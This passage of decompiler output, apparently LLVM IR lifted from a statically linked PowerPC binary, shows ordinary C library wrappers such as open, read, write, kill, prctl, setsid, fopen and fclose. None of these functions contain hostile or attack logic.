dec_label_pc_1000c31c:                            ; preds = %dec_label_pc_1000c2f8
  %v0_1000c31c = call i32 @__errno_location()
  store i32 -1, i32* @r4, align 4
  %v0_1000c324 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c324 = inttoptr i32 %v0_1000c31c to i32*
  store i32 %v0_1000c324, i32* %v2_1000c324, align 4
  %v0_1000c328.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000c328

dec_label_pc_1000c328:                            ; preds = %dec_label_pc_1000c2f8, %dec_label_pc_1000c31c
  %v0_1000c328 = phi i32 [ %v0_1000c308, %dec_label_pc_1000c2f8 ], [ %v0_1000c328.pre, %dec_label_pc_1000c31c ]
  %v1_1000c328 = icmp slt i32 %v0_1000c328, 0
  %v0_1000c32c = load i32, i32* @r30, align 4
  %v3_1000c32c = icmp eq i32 %v0_1000c32c, 0
  br i1 %v1_1000c328, label %dec_label_pc_1000c35c, label %dec_label_pc_1000c334

dec_label_pc_1000c334:                            ; preds = %dec_label_pc_1000c328
  br i1 %v3_1000c32c, label %dec_label_pc_1000c338, label %dec_label_pc_1000c34c.thread8

dec_label_pc_1000c34c.thread8:                    ; preds = %dec_label_pc_1000c334
  br label %dec_label_pc_1000c370

dec_label_pc_1000c338:                            ; preds = %dec_label_pc_1000c334
  %v0_1000c338 = load i32, i32* @r28, align 4
  %v3_1000c338 = icmp eq i32 %v0_1000c338, 0
  br i1 %v3_1000c338, label %dec_label_pc_1000c34c, label %dec_label_pc_1000c34c.thread

dec_label_pc_1000c34c.thread:                     ; preds = %dec_label_pc_1000c338
  br label %dec_label_pc_1000c354

dec_label_pc_1000c34c:                            ; preds = %dec_label_pc_1000c338
  %v0_1000c340 = load i32, i32* @r29, align 4
  store i32 268485448, i32* @lr, align 4
  %v1_1000c344 = call i32 @realloc(i32 %v0_1000c340)
  store i32 %v1_1000c344, i32* @r30, align 4
  %v3_1000c34c = icmp eq i32 %v1_1000c344, 0
  br i1 %v3_1000c34c, label %dec_label_pc_1000c354, label %dec_label_pc_1000c370

dec_label_pc_1000c354:                            ; preds = %dec_label_pc_1000c34c.thread, %dec_label_pc_1000c34c
  %v0_1000c354 = load i32, i32* @r29, align 4
  store i32 %v0_1000c354, i32* @r30, align 4
  br label %dec_label_pc_1000c370

dec_label_pc_1000c35c:                            ; preds = %dec_label_pc_1000c328
  br i1 %v3_1000c32c, label %dec_label_pc_1000c360, label %dec_label_pc_1000c36c

dec_label_pc_1000c360:                            ; preds = %dec_label_pc_1000c35c
  %v0_1000c360 = load i32, i32* @r29, align 4
  store i32 %v0_1000c360, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000c368.580 to i32), i32* @lr, align 4
  %v0_1000c364 = call i32 @free()
  br label %dec_label_pc_1000c370

dec_label_pc_1000c36c:                            ; preds = %dec_label_pc_1000c35c, %dec_label_pc_1000c2e8
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_1000c370

dec_label_pc_1000c370:                            ; preds = %dec_label_pc_1000c34c.thread8, %dec_label_pc_1000c34c, %dec_label_pc_1000c360, %dec_label_pc_1000c354, %dec_label_pc_1000c2ac, %dec_label_pc_1000c36c
  %v0_1000c374 = load i32, i32* @r30, align 4
  ret i32 %v0_1000c374

; uselistorder directives
  uselistorder i32 %v0_1000c308, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000c370, { 5, 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_1000c354, { 1, 0 }
  uselistorder label %dec_label_pc_1000c328, { 1, 0 }
  uselistorder label %dec_label_pc_1000c2e8, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000c394 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268485536, i32* @lr, align 4
  %v2_1000c39c = call i32 @getrlimit(i32 7, i32 %v2_1000c394)
  %v1_1000c3a0 = icmp slt i32 %v2_1000c39c, 0
  br i1 %v1_1000c3a0, label %dec_label_pc_1000c3b0, label %dec_label_pc_1000c3ac

dec_label_pc_1000c3ac:                            ; preds = %entry
  %v3_1000c3ac = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000c3b0

dec_label_pc_1000c3b0:                            ; preds = %entry, %dec_label_pc_1000c3ac
  %v0_1000c3bc = phi i32 [ 256, %entry ], [ %v3_1000c3ac, %dec_label_pc_1000c3ac ]
  ret i32 %v0_1000c3bc

; uselistorder directives
  uselistorder label %dec_label_pc_1000c3b0, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_1000c3c8 = load i32, i32* @global_var_10028600.581, align 4
  %v3_1000c3cc = icmp eq i32 %v3_1000c3c8, 0
  %v0_1000c3d0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000c3cc, i32 %v0_1000c3d0)
  ret i32 %v3_1000c3c8
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c3f4 = call i32 @__asm_mfcr()
  %v1_1000c3f8 = and i32 %v0_1000c3f4, 268435456
  %v3_1000c3f8 = icmp eq i32 %v1_1000c3f8, 0
  store i32 %v0_1000c3f4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c3f8, label %dec_label_pc_1000c410, label %dec_label_pc_1000c404

dec_label_pc_1000c404:                            ; preds = %entry
  %v0_1000c404 = call i32 @__errno_location()
  %v0_1000c408 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c408 = inttoptr i32 %v0_1000c404 to i32*
  store i32 %v0_1000c408, i32* %v2_1000c408, align 4
  br label %dec_label_pc_1000c410

dec_label_pc_1000c410:                            ; preds = %entry, %dec_label_pc_1000c404
  %v0_1000c420 = phi i32 [ %v0_1000c3f4, %entry ], [ -1, %dec_label_pc_1000c404 ]
  ret i32 %v0_1000c420

; uselistorder directives
  uselistorder label %dec_label_pc_1000c410, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c43c = call i32 @__asm_mfcr()
  %v1_1000c440 = and i32 %v0_1000c43c, 268435456
  %v3_1000c440 = icmp eq i32 %v1_1000c440, 0
  store i32 %v0_1000c43c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c440, label %dec_label_pc_1000c458, label %dec_label_pc_1000c44c

dec_label_pc_1000c44c:                            ; preds = %entry
  %v0_1000c44c = call i32 @__errno_location()
  %v0_1000c450 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c450 = inttoptr i32 %v0_1000c44c to i32*
  store i32 %v0_1000c450, i32* %v2_1000c450, align 4
  br label %dec_label_pc_1000c458

dec_label_pc_1000c458:                            ; preds = %entry, %dec_label_pc_1000c44c
  %v0_1000c468 = phi i32 [ %v0_1000c43c, %entry ], [ -1, %dec_label_pc_1000c44c ]
  ret i32 %v0_1000c468

; uselistorder directives
  uselistorder label %dec_label_pc_1000c458, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c484 = call i32 @__asm_mfcr()
  %v1_1000c488 = and i32 %v0_1000c484, 268435456
  %v3_1000c488 = icmp eq i32 %v1_1000c488, 0
  store i32 %v0_1000c484, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c488, label %dec_label_pc_1000c4a0, label %dec_label_pc_1000c494

dec_label_pc_1000c494:                            ; preds = %entry
  %v0_1000c494 = call i32 @__errno_location()
  %v0_1000c498 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c498 = inttoptr i32 %v0_1000c494 to i32*
  store i32 %v0_1000c498, i32* %v2_1000c498, align 4
  br label %dec_label_pc_1000c4a0

dec_label_pc_1000c4a0:                            ; preds = %entry, %dec_label_pc_1000c494
  %v0_1000c4b0 = phi i32 [ %v0_1000c484, %entry ], [ -1, %dec_label_pc_1000c494 ]
  ret i32 %v0_1000c4b0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c4a0, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000c4c8 = and i32 %arg2, 64
  %v3_1000c4c8 = icmp eq i32 %v1_1000c4c8, 0
  br i1 %v3_1000c4c8, label %dec_label_pc_1000c4f4, label %dec_label_pc_1000c4d8

dec_label_pc_1000c4d8:                            ; preds = %entry
  %v2_1000c4e0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c4e0, i32* %stack_var_-32, align 4
  %v0_1000c4f0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000c4f4

dec_label_pc_1000c4f4:                            ; preds = %entry, %dec_label_pc_1000c4d8
  %v0_1000c4f4 = phi i32 [ 0, %entry ], [ %v0_1000c4f0, %dec_label_pc_1000c4d8 ]
  store i32 %v0_1000c4f4, i32* @r5, align 4
  %v0_1000c4fc = call i32 @__asm_mfcr()
  %v1_1000c500 = and i32 %v0_1000c4fc, 268435456
  %v3_1000c500 = icmp eq i32 %v1_1000c500, 0
  store i32 %v0_1000c4fc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c500, label %dec_label_pc_1000c518, label %dec_label_pc_1000c50c

dec_label_pc_1000c50c:                            ; preds = %dec_label_pc_1000c4f4
  %v0_1000c50c = call i32 @__errno_location()
  %v0_1000c510 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c510 = inttoptr i32 %v0_1000c50c to i32*
  store i32 %v0_1000c510, i32* %v2_1000c510, align 4
  br label %dec_label_pc_1000c518

dec_label_pc_1000c518:                            ; preds = %dec_label_pc_1000c4f4, %dec_label_pc_1000c50c
  %v0_1000c528 = phi i32 [ %v0_1000c4fc, %dec_label_pc_1000c4f4 ], [ -1, %dec_label_pc_1000c50c ]
  ret i32 %v0_1000c528

; uselistorder directives
  uselistorder label %dec_label_pc_1000c518, { 1, 0 }
  uselistorder label %dec_label_pc_1000c4f4, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v2_1000c538 = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_1000c538
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c554 = call i32 @__asm_mfcr()
  %v1_1000c558 = and i32 %v0_1000c554, 268435456
  %v3_1000c558 = icmp eq i32 %v1_1000c558, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_1000c554, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c558, label %dec_label_pc_1000c570, label %dec_label_pc_1000c564

dec_label_pc_1000c564:                            ; preds = %entry
  %v0_1000c564 = call i32 @__errno_location()
  %v0_1000c568 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c568 = inttoptr i32 %v0_1000c564 to i32*
  store i32 %v0_1000c568, i32* %v2_1000c568, align 4
  br label %dec_label_pc_1000c570

dec_label_pc_1000c570:                            ; preds = %entry, %dec_label_pc_1000c564
  %v0_1000c580 = phi i32 [ %v0_1000c554, %entry ], [ -1, %dec_label_pc_1000c564 ]
  ret i32 %v0_1000c580

; uselistorder directives
  uselistorder label %dec_label_pc_1000c570, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c59c = call i32 @__asm_mfcr()
  %v1_1000c5a0 = and i32 %v0_1000c59c, 268435456
  %v3_1000c5a0 = icmp eq i32 %v1_1000c5a0, 0
  store i32 %v0_1000c59c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c5a0, label %dec_label_pc_1000c5b8, label %dec_label_pc_1000c5ac

dec_label_pc_1000c5ac:                            ; preds = %entry
  %v0_1000c5ac = call i32 @__errno_location()
  %v0_1000c5b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c5b0 = inttoptr i32 %v0_1000c5ac to i32*
  store i32 %v0_1000c5b0, i32* %v2_1000c5b0, align 4
  br label %dec_label_pc_1000c5b8

dec_label_pc_1000c5b8:                            ; preds = %entry, %dec_label_pc_1000c5ac
  %v0_1000c5c8 = phi i32 [ %v0_1000c59c, %entry ], [ -1, %dec_label_pc_1000c5ac ]
  ret i32 %v0_1000c5c8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c5b8, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c5e4 = call i32 @__asm_mfcr()
  %v1_1000c5e8 = and i32 %v0_1000c5e4, 268435456
  %v3_1000c5e8 = icmp eq i32 %v1_1000c5e8, 0
  store i32 %v0_1000c5e4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c5e8, label %dec_label_pc_1000c600, label %dec_label_pc_1000c5f4

dec_label_pc_1000c5f4:                            ; preds = %entry
  %v0_1000c5f4 = call i32 @__errno_location()
  %v0_1000c5f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c5f8 = inttoptr i32 %v0_1000c5f4 to i32*
  store i32 %v0_1000c5f8, i32* %v2_1000c5f8, align 4
  br label %dec_label_pc_1000c600

dec_label_pc_1000c600:                            ; preds = %entry, %dec_label_pc_1000c5f4
  %v0_1000c610 = phi i32 [ %v0_1000c5e4, %entry ], [ -1, %dec_label_pc_1000c5f4 ]
  ret i32 %v0_1000c610

; uselistorder directives
  uselistorder label %dec_label_pc_1000c600, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c62c = call i32 @__asm_mfcr()
  %v1_1000c630 = and i32 %v0_1000c62c, 268435456
  %v3_1000c630 = icmp eq i32 %v1_1000c630, 0
  store i32 %v0_1000c62c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c630, label %dec_label_pc_1000c648, label %dec_label_pc_1000c63c

dec_label_pc_1000c63c:                            ; preds = %entry
  %v0_1000c63c = call i32 @__errno_location()
  %v0_1000c640 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c640 = inttoptr i32 %v0_1000c63c to i32*
  store i32 %v0_1000c640, i32* %v2_1000c640, align 4
  br label %dec_label_pc_1000c648

dec_label_pc_1000c648:                            ; preds = %entry, %dec_label_pc_1000c63c
  %v0_1000c658 = phi i32 [ %v0_1000c62c, %entry ], [ -1, %dec_label_pc_1000c63c ]
  ret i32 %v0_1000c658

; uselistorder directives
  uselistorder label %dec_label_pc_1000c648, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c674 = call i32 @__asm_mfcr()
  %v1_1000c678 = and i32 %v0_1000c674, 268435456
  %v3_1000c678 = icmp eq i32 %v1_1000c678, 0
  store i32 %v0_1000c674, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c678, label %dec_label_pc_1000c690, label %dec_label_pc_1000c684

dec_label_pc_1000c684:                            ; preds = %entry
  %v0_1000c684 = call i32 @__errno_location()
  %v0_1000c688 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c688 = inttoptr i32 %v0_1000c684 to i32*
  store i32 %v0_1000c688, i32* %v2_1000c688, align 4
  br label %dec_label_pc_1000c690

dec_label_pc_1000c690:                            ; preds = %entry, %dec_label_pc_1000c684
  %v0_1000c6a0 = phi i32 [ %v0_1000c674, %entry ], [ -1, %dec_label_pc_1000c684 ]
  ret i32 %v0_1000c6a0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c690, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_1000c6a4 = icmp eq i32 %arg2, 0
  br i1 %v3_1000c6a4, label %dec_label_pc_1000c6e4, label %dec_label_pc_1000c6cc

dec_label_pc_1000c6cc:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_1000c6e4, label %dec_label_pc_1000c6d4

dec_label_pc_1000c6d4:                            ; preds = %dec_label_pc_1000c6cc
  %v0_1000c6d4 = call i32 @__errno_location()
  %v2_1000c6dc = inttoptr i32 %v0_1000c6d4 to i32*
  store i32 22, i32* %v2_1000c6dc, align 4
  %v0_1000c708.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c704

dec_label_pc_1000c6e4:                            ; preds = %dec_label_pc_1000c6cc, %entry
  %v0_1000c6e8 = call i32 @__asm_mfcr()
  %v1_1000c6ec = and i32 %v0_1000c6e8, 268435456
  %v3_1000c6ec = icmp eq i32 %v1_1000c6ec, 0
  store i32 %v0_1000c6e8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c6ec, label %dec_label_pc_1000c704, label %dec_label_pc_1000c6f8

dec_label_pc_1000c6f8:                            ; preds = %dec_label_pc_1000c6e4
  %v0_1000c6f8 = call i32 @__errno_location()
  %v0_1000c6fc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c6fc = inttoptr i32 %v0_1000c6f8 to i32*
  store i32 %v0_1000c6fc, i32* %v2_1000c6fc, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c704

dec_label_pc_1000c704:                            ; preds = %dec_label_pc_1000c6e4, %dec_label_pc_1000c6d4, %dec_label_pc_1000c6f8
  %v0_1000c708 = phi i32 [ %v0_1000c6e8, %dec_label_pc_1000c6e4 ], [ %v0_1000c708.pre, %dec_label_pc_1000c6d4 ], [ -1, %dec_label_pc_1000c6f8 ]
  ret i32 %v0_1000c708

; uselistorder directives
  uselistorder label %dec_label_pc_1000c704, { 2, 0, 1 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c734 = call i32 @__asm_mfcr()
  %v1_1000c738 = and i32 %v0_1000c734, 268435456
  %v3_1000c738 = icmp eq i32 %v1_1000c738, 0
  store i32 %v0_1000c734, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c738, label %dec_label_pc_1000c750, label %dec_label_pc_1000c744

dec_label_pc_1000c744:                            ; preds = %entry
  %v0_1000c744 = call i32 @__errno_location()
  %v0_1000c748 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c748 = inttoptr i32 %v0_1000c744 to i32*
  store i32 %v0_1000c748, i32* %v2_1000c748, align 4
  br label %dec_label_pc_1000c750

dec_label_pc_1000c750:                            ; preds = %entry, %dec_label_pc_1000c744
  %v0_1000c760 = phi i32 [ %v0_1000c734, %entry ], [ -1, %dec_label_pc_1000c744 ]
  ret i32 %v0_1000c760

; uselistorder directives
  uselistorder label %dec_label_pc_1000c750, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1000c768 = call i32 @wait4(i32 0)
  ret i32 %v1_1000c768
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c784 = call i32 @__asm_mfcr()
  %v1_1000c788 = and i32 %v0_1000c784, 268435456
  %v3_1000c788 = icmp eq i32 %v1_1000c788, 0
  store i32 %v0_1000c784, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c788, label %dec_label_pc_1000c7a0, label %dec_label_pc_1000c794

dec_label_pc_1000c794:                            ; preds = %entry
  %v0_1000c794 = call i32 @__errno_location()
  %v0_1000c798 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c798 = inttoptr i32 %v0_1000c794 to i32*
  store i32 %v0_1000c798, i32* %v2_1000c798, align 4
  br label %dec_label_pc_1000c7a0

dec_label_pc_1000c7a0:                            ; preds = %entry, %dec_label_pc_1000c794
  %v0_1000c7b0 = phi i32 [ %v0_1000c784, %entry ], [ -1, %dec_label_pc_1000c794 ]
  ret i32 %v0_1000c7b0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c7a0, { 1, 0 }
}

define i32 @isspace(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000c7b8 = mul i32 %arg1, 2
  %v3_1000c7bc = load i32, i32* inttoptr (i32 268600696 to i32*), align 8
  %v2_1000c7c0 = add i32 %v3_1000c7bc, %v1_1000c7b8
  %v3_1000c7c0 = inttoptr i32 %v2_1000c7c0 to i16*
  %v4_1000c7c0 = load i16, i16* %v3_1000c7c0, align 2
  %v5_1000c7c0 = zext i16 %v4_1000c7c0 to i32
  %v1_1000c7c4 = call i32 @__asm_rlwinm(i32 %v5_1000c7c0, i32 0, i32 26, i32 26)
  ret i32 %v1_1000c7c4
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000c7cc = add i32 %arg1, 128
  %v1_1000c7d0 = mul i32 %arg1, 2
  %v2_1000c7d4 = icmp ugt i32 %v1_1000c7cc, 383
  %v0_1000c7d8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000c7d4, i32 %v0_1000c7d8)
  %v3_1000c7e0 = load i32, i32* inttoptr (i32 268600704 to i32*), align 128
  %v2_1000c7e4 = add i32 %v1_1000c7d0, %v3_1000c7e0
  %v3_1000c7e4 = inttoptr i32 %v2_1000c7e4 to i16*
  %v4_1000c7e4 = load i16, i16* %v3_1000c7e4, align 2
  %v5_1000c7e4 = sext i16 %v4_1000c7e4 to i32
  ret i32 %v5_1000c7e4
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10028610.583 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000c80c = add i32 %tmp, 52
  %v3_1000c80c = inttoptr i32 %v2_1000c80c to i32*
  %v4_1000c80c = load i32, i32* %v3_1000c80c, align 4
  store i32 %v4_1000c80c, i32* @r28, align 4
  %v3_1000c810 = icmp eq i32 %v4_1000c80c, 0
  store i1 %v3_1000c810, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c810, label %dec_label_pc_1000c818, label %dec_label_pc_1000c838

dec_label_pc_1000c818:                            ; preds = %entry
  %v2_1000c820 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000c820, i32* @r3, align 4
  %v0_1000c82c = call i32 @__pthread_return_void()
  %v0_1000c834 = call i32 @__pthread_return_0()
  %v0_1000c838.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c838

dec_label_pc_1000c838:                            ; preds = %entry, %dec_label_pc_1000c818
  %v0_1000c848 = phi i32 [ %tmp, %entry ], [ %v0_1000c838.pre, %dec_label_pc_1000c818 ]
  %v1_1000c838 = inttoptr i32 %v0_1000c848 to i16*
  %v2_1000c838 = load i16, i16* %v1_1000c838, align 2
  %v3_1000c838 = zext i16 %v2_1000c838 to i32
  store i32 0, i32* @r27, align 4
  %v1_1000c840 = and i32 %v3_1000c838, 64
  %v3_1000c840 = icmp eq i32 %v1_1000c840, 0
  br i1 %v3_1000c840, label %dec_label_pc_1000c854, label %dec_label_pc_1000c848

dec_label_pc_1000c848:                            ; preds = %dec_label_pc_1000c838
  store i32 268486736, i32* @lr, align 4
  %v4_1000c84c = call i32 @fflush_unlocked(i16* %v1_1000c838, i32 %v1_1000c840)
  store i32 %v4_1000c84c, i32* @r27, align 4
  %v0_1000c854.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c854

dec_label_pc_1000c854:                            ; preds = %dec_label_pc_1000c838, %dec_label_pc_1000c848
  %v0_1000c854 = phi i32 [ %v0_1000c848, %dec_label_pc_1000c838 ], [ %v0_1000c854.pre, %dec_label_pc_1000c848 ]
  %v1_1000c854 = add i32 %v0_1000c854, 4
  %v2_1000c854 = inttoptr i32 %v1_1000c854 to i32*
  %v3_1000c854 = load i32, i32* %v2_1000c854, align 4
  store i32 268486748, i32* @lr, align 4
  %v1_1000c858 = call i32 @__libc_close(i32 %v3_1000c854)
  %v3_1000c85c = icmp eq i32 %v1_1000c858, 0
  store i1 %v3_1000c85c, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_1000c858, -1
  br i1 %tmp8, label %dec_label_pc_1000c868, label %dec_label_pc_1000c864

dec_label_pc_1000c864:                            ; preds = %dec_label_pc_1000c854
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000c868

dec_label_pc_1000c868:                            ; preds = %dec_label_pc_1000c854, %dec_label_pc_1000c864
  store i32 ptrtoint ([3 x i8]* @global_var_10010ad0.584 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_10028258.585 to i32), i32* @r29, align 4
  %v1_1000c87c = load i32, i32* @r31, align 4
  %v2_1000c87c = add i32 %v1_1000c87c, 4
  %v3_1000c87c = inttoptr i32 %v2_1000c87c to i32*
  store i32 -1, i32* %v3_1000c87c, align 4
  %v2_1000c880 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000c880, i32* @r30, align 4
  store i32 %v2_1000c880, i32* @r3, align 4
  %v0_1000c890 = call i32 @__pthread_return_void()
  %v0_1000c898 = call i32 @__pthread_return_0()
  %v3_1000c8a0 = load i32, i32* @global_var_100285e8.586, align 4
  store i32 %v2_1000c880, i32* @r3, align 4
  %v1_1000c8ac = add i32 %v3_1000c8a0, 1
  store i32 %v1_1000c8ac, i32* @global_var_100285e8.586, align 4
  %v0_1000c8b4 = call i32 @__pthread_return_void()
  %v0_1000c8b8 = load i32, i32* @r31, align 4
  %v1_1000c8b8 = inttoptr i32 %v0_1000c8b8 to i16*
  %v2_1000c8b8 = load i16, i16* %v1_1000c8b8, align 2
  %v3_1000c8b8 = zext i16 %v2_1000c8b8 to i32
  %v0_1000c8bc = load i32, i32* @r28, align 4
  %v3_1000c8bc = icmp eq i32 %v0_1000c8bc, 0
  store i1 %v3_1000c8bc, i1* %cr7_eq.global-to-local, align 1
  %v1_1000c8c0 = call i32 @__asm_rlwinm(i32 %v3_1000c8b8, i32 0, i32 17, i32 18)
  %v1_1000c8c8 = or i32 %v1_1000c8c0, 48
  %v1_1000c8cc = trunc i32 %v1_1000c8c8 to i16
  %v2_1000c8cc = load i32, i32* @r31, align 4
  %v3_1000c8cc = inttoptr i32 %v2_1000c8cc to i16*
  store i16 %v1_1000c8cc, i16* %v3_1000c8cc, align 2
  %v0_1000c8d0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000c8d0, label %dec_label_pc_1000c8d4, label %dec_label_pc_1000c8e0

dec_label_pc_1000c8d4:                            ; preds = %dec_label_pc_1000c868
  %v2_1000c8d4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000c8d4, i32* @r3, align 4
  %v0_1000c8dc = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000c8e0

dec_label_pc_1000c8e0:                            ; preds = %dec_label_pc_1000c868, %dec_label_pc_1000c8d4
  %v0_1000c8e0 = load i32, i32* @r31, align 4
  %v1_1000c8e0 = inttoptr i32 %v0_1000c8e0 to i16*
  %v2_1000c8e0 = load i16, i16* %v1_1000c8e0, align 2
  %v1_1000c8e4 = and i16 %v2_1000c8e0, 16384
  %v3_1000c8e4 = icmp eq i16 %v1_1000c8e4, 0
  br i1 %v3_1000c8e4, label %dec_label_pc_1000c8f4, label %dec_label_pc_1000c8ec

dec_label_pc_1000c8ec:                            ; preds = %dec_label_pc_1000c8e0
  %v1_1000c8ec = add i32 %v0_1000c8e0, 8
  %v2_1000c8ec = inttoptr i32 %v1_1000c8ec to i32*
  %v3_1000c8ec = load i32, i32* %v2_1000c8ec, align 4
  store i32 %v3_1000c8ec, i32* @r3, align 4
  store i32 268486900, i32* @lr, align 4
  %v0_1000c8f0 = call i32 @free()
  br label %dec_label_pc_1000c8f4

dec_label_pc_1000c8f4:                            ; preds = %dec_label_pc_1000c8e0, %dec_label_pc_1000c8ec
  store i32 %v2_1000c880, i32* @r3, align 4
  %v0_1000c900 = call i32 @__pthread_return_void()
  %v0_1000c908 = call i32 @__pthread_return_0()
  %v3_1000c910 = load i32, i32* @global_var_100285ec.587, align 4
  store i32 %v2_1000c880, i32* @r3, align 4
  %v1_1000c91c = add i32 %v3_1000c910, 1
  store i32 %v1_1000c91c, i32* @global_var_100285ec.587, align 4
  %v0_1000c924 = call i32 @__pthread_return_void()
  store i32 268486956, i32* @lr, align 4
  %v0_1000c928 = call i32 @_stdio_openlist_dec_use()
  %v0_1000c930 = load i32, i32* @r27, align 4
  ret i32 %v0_1000c930

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c8f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c868, { 1, 0 }
  uselistorder label %dec_label_pc_1000c854, { 1, 0 }
  uselistorder label %dec_label_pc_1000c838, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_1000c94c = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_1000c94c
}

